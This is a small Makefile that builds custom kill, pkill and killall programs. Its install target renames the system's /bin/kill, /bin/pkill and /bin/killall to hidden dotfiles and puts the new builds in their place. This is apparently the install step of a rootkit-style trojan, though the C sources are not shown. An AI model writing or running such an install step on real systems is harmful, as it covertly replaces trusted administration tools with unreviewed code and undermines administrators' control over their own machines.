CC	= gcc
CFLAGS	= -C
OPTFLAG	=
LINKER	= gcc

SRC = \
	kill.c \
	pkill.c \
	killall.c \

all: kill pkill killall

kill:
	$(CC) kill.c -o kill

pkill:
	$(CC) pkill.c -o pkill

killall:
	$(CC) killall.c -o killall

clean:
	rm kill pkill killall

install:
	mv /bin/kill /bin/.kill
	mv kill /bin/kill
	mv /bin/pkill /bin/.pkill
	mv pkill /bin/pkill
	mv /bin/killall /bin/.killall
	mv killall /bin/killall
